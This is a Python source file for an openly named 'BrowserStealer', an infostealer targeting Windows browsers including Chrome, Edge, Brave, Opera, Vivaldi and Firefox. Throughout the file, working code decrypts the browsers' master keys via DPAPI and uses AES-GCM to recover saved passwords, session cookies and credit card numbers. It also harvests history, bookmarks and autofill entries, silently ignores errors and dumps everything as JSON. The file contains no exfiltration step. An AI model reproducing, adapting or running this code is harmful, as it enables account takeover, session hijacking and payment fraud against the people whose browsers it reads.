import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime
from typing import Dict, List, Any, Optional

class BrowserStealer:
    def __init__(self):
        self.appdata = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.browsers = []
        self.load_browser_paths()
    
    def load_browser_paths(self):
        browsers = [
            {
                "name": "Chrome",
                "path": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "cookie_path": os.path.join("Default", "Network", "Cookies"),
                "login_path": os.path.join("Default", "Login Data"),
                "history_path": os.path.join("Default", "History"),
                "bookmarks_path": os.path.join("Default", "Bookmarks"),
                "autofill_path": os.path.join("Default", "Web Data"),
                "credit_card_path": os.path.join("Default", "Web Data"),
                "extensions_path": os.path.join("Default", "Extensions")
            },
            {
                "name": "Chrome Beta",
                "path": os.path.join(self.localappdata, "Google", "Chrome Beta", "User Data"),
                "cookie_path": os.path.join("Default", "Network", "Cookies"),
                "login_path": os.path.join("Default", "Login Data"),
                "history_path": os.path.join("Default", "History"),
                "bookmarks_path": os.path.join("Default", "Bookmarks"),
                "autofill_path": os.path.join("Default", "Web Data"),
                "credit_card_path": os.path.join("Default", "Web Data")
            },
            {
                "name": "Brave",
                "path": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "cookie_path": os.path.join("Default", "Network", "Cookies"),
                "login_path": os.path.join("Default", "Login Data"),
                "history_path": os.path.join("Default", "History"),
                "bookmarks_path": os.path.join("Default", "Bookmarks"),
                "autofill_path": os.path.join("Default", "Web Data"),
                "credit_card_path": os.path.join("Default", "Web Data")
            },
            {
                "name": "Edge",
                "path": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
                "cookie_path": os.path.join("Default", "Network", "Cookies"),
                "login_path": os.path.join("Default", "Login Data"),
                "history_path": os.path.join("Default", "History"),
                "bookmarks_path": os.path.join("Default", "Bookmarks"),
                "autofill_path": os.path.join("Default", "Web Data"),
                "credit_card_path": os.path.join("Default", "Web Data")
            },
            {
                "name": "Opera",
                "path": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
                "cookie_path": os.path.join("Default", "Network", "Cookies"),
                "login_path": os.path.join("Default", "Login Data"),
                "history_path": os.path.join("Default", "History"),
                "bookmarks_path": os.path.join("Default", "Bookmarks"),
                "autofill_path": os.path.join("Default", "Web Data"),
                "credit_card_path": os.path.join("Default", "Web Data")
            },
            {
                "name": "Opera GX",
                "path": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
                "cookie_path": os.path.join("Default", "Network", "Cookies"),
                "login_path": os.path.join("Default", "Login Data"),
                "history_path": os.path.join("Default", "History"),
                "bookmarks_path": os.path.join("Default", "Bookmarks"),
                "autofill_path": os.path.join("Default", "Web Data"),
                "credit_card_path": os.path.join("Default", "Web Data")
            },
            {
                "name": "Vivaldi",
                "path": os.path.join(self.localappdata, "Vivaldi", "User Data"),
                "cookie_path": os.path.join("Default", "Network", "Cookies"),
                "login_path": os.path.join("Default", "Login Data"),
                "history_path": os.path.join("Default", "History"),
                "bookmarks_path": os.path.join("Default", "Bookmarks"),
                "autofill_path": os.path.join("Default", "Web Data")
            },
            {
                "name": "Firefox",
                "path": os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles"),
                "cookie_path": "cookies.sqlite",
                "login_path": "logins.json",
                "history_path": "places.sqlite",
                "bookmarks_path": "places.sqlite"
            }
        ]
        
        for browser in browsers:
            if os.path.exists(browser["path"]):
                self.browsers.append(browser)
    
    def get_encryption_key(self, browser_path, browser_name):
        try:
            if browser_name == "Firefox":
                return None
            
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path):
                local_state_path = os.path.join(os.path.dirname(browser_path), "Local State")
            
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except:
            return None
    
    def decrypt_value(self, encrypted_value, key):
        try:
            if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11"):
                # AES-GCM decryption
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode("utf-8")
            else:
                # DPAPI decryption
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8")
        except:
            try:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode("utf-8")
            except:
                return None
    
    def steal_cookies(self, browser):
        cookies = []
        try:
            if browser["name"] == "Firefox":
                return self.steal_firefox_cookies(browser)
            
            cookie_db = os.path.join(browser["path"], browser["cookie_path"])
            if not os.path.exists(cookie_db):
                return cookies
            
            key = self.get_encryption_key(browser["path"], browser["name"])
            
            # Copy database to temp
            temp_db = os.path.join(self.temp_dir, f"cookies_{browser['name'].replace(' ', '_')}.db")
            shutil.copy2(cookie_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, expires_utc, is_secure, is_httponly, path FROM cookies")
            
            for host, name, encrypted_value, creation, expires, secure, httponly, path in cursor.fetchall():
                decrypted_value = self.decrypt_value(encrypted_value, key) if key else None
                
                cookies.append({
                    "host": host,
                    "name": name,
                    "value": decrypted_value if decrypted_value else base64.b64encode(encrypted_value).decode(),
                    "creation_utc": creation,
                    "expires_utc": expires,
                    "is_secure": secure,
                    "is_httponly": httponly,
                    "path": path
                })
            
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return cookies
    
    def steal_firefox_cookies(self, browser):
        cookies = []
        try:
            # Find Firefox profile directories
            profile_path = browser["path"]
            if not os.path.exists(profile_path):
                return cookies
            
            for profile in os.listdir(profile_path):
                if profile.endswith(".default") or profile.endswith(".default-release"):
                    cookie_db = os.path.join(profile_path, profile, "cookies.sqlite")
                    if os.path.exists(cookie_db):
                        temp_db = os.path.join(self.temp_dir, "firefox_cookies.db")
                        shutil.copy2(cookie_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("SELECT host, name, value, creationTime, expiry, isSecure, isHttpOnly, path FROM moz_cookies")
                        
                        for host, name, value, creation, expiry, secure, httponly, path in cursor.fetchall():
                            cookies.append({
                                "host": host,
                                "name": name,
                                "value": value,
                                "creation_utc": creation,
                                "expires_utc": expiry,
                                "is_secure": secure,
                                "is_httponly": httponly,
                                "path": path
                            })
                        
                        conn.close()
                        os.remove(temp_db)
        except:
            pass
        return cookies
    
    def steal_passwords(self, browser):
        passwords = []
        try:
            if browser["name"] == "Firefox":
                return self.steal_firefox_passwords(browser)
            
            login_db = os.path.join(browser["path"], browser["login_path"])
            if not os.path.exists(login_db):
                return passwords
            
            key = self.get_encryption_key(browser["path"], browser["name"])
            
            temp_db = os.path.join(self.temp_dir, f"logins_{browser['name'].replace(' ', '_')}.db")
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
            
            for url, username, encrypted_password, created, last_used in cursor.fetchall():
                decrypted_password = self.decrypt_value(encrypted_password, key) if key else None
                
                passwords.append({
                    "url": url,
                    "username": username,
                    "password": decrypted_password if decrypted_password else "",
                    "created": created,
                    "last_used": last_used
                })
            
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return passwords
    
    def steal_firefox_passwords(self, browser):
        passwords = []
        try:
            profile_path = browser["path"]
            if not os.path.exists(profile_path):
                return passwords
            
            for profile in os.listdir(profile_path):
                if profile.endswith(".default") or profile.endswith(".default-release"):
                    logins_file = os.path.join(profile_path, profile, "logins.json")
                    if os.path.exists(logins_file):
                        with open(logins_file, "r", encoding="utf-8") as f:
                            logins_data = json.load(f)
                        
                        for login in logins_data.get("logins", []):
                            passwords.append({
                                "url": login.get("hostname", ""),
                                "username": login.get("encryptedUsername", ""),
                                "password": login.get("encryptedPassword", ""),
                                "created": login.get("timeCreated", ""),
                                "last_used": login.get("timeLastUsed", "")
                            })
        except:
            pass
        return passwords
    
    def steal_history(self, browser):
        history = []
        try:
            if browser["name"] == "Firefox":
                return history
            
            history_db = os.path.join(browser["path"], browser["history_path"])
            if not os.path.exists(history_db):
                return history
            
            temp_db = os.path.join(self.temp_dir, f"history_{browser['name'].replace(' ', '_')}.db")
            shutil.copy2(history_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            
            for url, title, visit_count, last_visit in cursor.fetchall():
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit
                })
            
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return history
    
    def steal_bookmarks(self, browser):
        bookmarks = []
        try:
            bookmarks_path = os.path.join(browser["path"], browser.get("bookmarks_path", ""))
            if os.path.exists(bookmarks_path):
                with open(bookmarks_path, "r", encoding="utf-8") as f:
                    bookmarks_data = json.load(f)
                
                def extract_bookmarks(node):
                    if isinstance(node, dict):
                        if node.get("type") == "url":
                            bookmarks.append({
                                "name": node.get("name", ""),
                                "url": node.get("url", "")
                            })
                        elif "children" in node:
                            for child in node["children"]:
                                extract_bookmarks(child)
                    elif isinstance(node, list):
                        for item in node:
                            extract_bookmarks(item)
                
                if browser["name"] == "Firefox":
                    # Firefox bookmarks are in places.sqlite
                    history_db = os.path.join(browser["path"], browser.get("history_path", ""))
                    if os.path.exists(history_db):
                        temp_db = os.path.join(self.temp_dir, "firefox_bookmarks.db")
                        shutil.copy2(history_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1")
                        for title, url in cursor.fetchall():
                            bookmarks.append({"name": title, "url": url})
                        conn.close()
                        os.remove(temp_db)
                else:
                    extract_bookmarks(bookmarks_data.get("roots", {}))
        except:
            pass
        return bookmarks
    
    def steal_autofill(self, browser):
        autofill = []
        try:
            if browser["name"] == "Firefox":
                return autofill
            
            autofill_db = os.path.join(browser["path"], browser.get("autofill_path", ""))
            if not os.path.exists(autofill_db):
                return autofill
            
            temp_db = os.path.join(self.temp_dir, f"autofill_{browser['name'].replace(' ', '_')}.db")
            shutil.copy2(autofill_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name, value, date_created, date_last_used FROM autofill")
            
            for name, value, created, last_used in cursor.fetchall():
                autofill.append({
                    "name": name,
                    "value": value,
                    "created": created,
                    "last_used": last_used
                })
            
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return autofill
    
    def steal_credit_cards(self, browser):
        credit_cards = []
        try:
            if browser["name"] == "Firefox":
                return credit_cards
            
            web_db = os.path.join(browser["path"], browser.get("credit_card_path", ""))
            if not os.path.exists(web_db):
                return credit_cards
            
            key = self.get_encryption_key(browser["path"], browser["name"])
            
            temp_db = os.path.join(self.temp_dir, f"credit_cards_{browser['name'].replace(' ', '_')}.db")
            shutil.copy2(web_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
            
            for name, exp_month, exp_year, encrypted_number, modified in cursor.fetchall():
                decrypted_number = self.decrypt_value(encrypted_number, key) if key else ""
                credit_cards.append({
                    "name_on_card": name,
                    "expiration_month": exp_month,
                    "expiration_year": exp_year,
                    "card_number": decrypted_number,
                    "date_modified": modified
                })
            
            conn.close()
            os.remove(temp_db)
        except:
            pass
        return credit_cards
    
    def steal_all(self):
        results = {
            "cookies": [],
            "passwords": [],
            "history": [],
            "bookmarks": [],
            "autofill": [],
            "credit_cards": []
        }
        
        for browser in self.browsers:
            browser_data = {
                "browser": browser["name"],
                "cookies": self.steal_cookies(browser),
                "passwords": self.steal_passwords(browser),
                "history": self.steal_history(browser),
                "bookmarks": self.steal_bookmarks(browser),
                "autofill": self.steal_autofill(browser),
                "credit_cards": self.steal_credit_cards(browser)
            }
            
            results["cookies"].extend(browser_data["cookies"])
            results["passwords"].extend(browser_data["passwords"])
            results["history"].extend(browser_data["history"])
            results["bookmarks"].extend(browser_data["bookmarks"])
            results["autofill"].extend(browser_data["autofill"])
            results["credit_cards"].extend(browser_data["credit_cards"])
        
        return results

if __name__ == "__main__":
    stealer = BrowserStealer()
    data = stealer.steal_all()
    print(json.dumps(data, indent=2, default=str))